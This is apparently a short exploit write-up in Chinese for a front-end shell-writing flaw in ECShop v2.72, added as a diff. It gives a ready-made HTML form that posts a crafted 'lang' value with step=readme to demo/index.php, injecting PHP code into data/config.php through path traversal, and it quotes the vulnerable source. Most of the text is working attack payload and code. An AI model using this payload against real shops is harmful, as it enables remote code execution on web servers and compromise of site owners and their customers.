@@ -1,0 +1,91 @@
+ecshop v2.72 前台写shell漏洞
+
+ecshop v2.72 前台写shell漏洞 全文]
+<title>ecshop v2.72 前台写shell漏洞 by:xhm1n9</title>
+
+<form method=”post” name=”register” action=”http://127.1/ecshop2.72/demo/index.php”>
+
+<h3>ecshop v2.72 前台写shell漏洞</h3><br>利用方试：提交两次，第二次内容任意</br>
+
+<input type=”text” name=”lang” size=”80″ value=”‘);phpinfo();(_1_/../../../index” />
+
+<input type=”hidden” name=”step” value=”readme” />
+
+<button class=”submit” type=”submit” name=”regsubmit” value=”true”>提交</button>
+
+</form>
+
+<!————-
+
+demo/index.php
+if (!empty($_POST[''lang'']))
+
+{
+
+$lang_charset = explode(‘_’, $_POST[''lang'']);
+
+$updater_lang = $lang_charset[0].’_’.$lang_charset[1];
+
+$ec_charset = $lang_charset[2];
+
+}
+
+………………………………….
+
+$updater_lang_package_path = ROOT_PATH . ‘demo/languages/’ . $updater_lang . ‘_’ . $ec_charset .’.php’;
+
+if (file_exists($updater_lang_package_path))
+
+{
+
+include_once($updater_lang_package_path);
+
+$smarty->assign(‘lang’, $_LANG);
+
+}
+
+else
+
+{
+
+die(‘Can\’t find language package!’);
+
+}
+
+/* 初始化流程控制变量 */
+
+$step = isset($_REQUEST[''step'']) ? $_REQUEST[''step''] : ‘sel_lang’;
+
+$smarty->assign(‘ec_charset’, $ec_charset);
+
+$smarty->assign(‘updater_lang’, $updater_lang);
+
+switch($step)
+
+{
+
+case ‘readme’ :
+
+write_charset_config($updater_lang, $ec_charset);
+
+…………………………………
+
+function write_charset_config($lang, $charset)
+
+{
+
+$config_file = ROOT_PATH . ‘data/config.php’;
+
+$s = file_get_contents($config_file);
+
+$s = insertconfig($s, “/\?\>/”,”");
+
+$s = insertconfig($s, “/define\(‘EC_LANGUAGE’,\s*’.*?’\);/i”, “define(‘EC_LANGUAGE’, ‘” . $lang . “‘);”);
+
+$s = insertconfig($s, “/define\(‘EC_CHARSET’,\s*’.*?’\);/i”, “define(‘EC_CHARSET’, ‘” . $charset . “‘);”);
+
+$s = insertconfig($s, “/\?\>/”,”?>”);
+
+return file_put_contents($config_file, $s);
+
+}—————–>
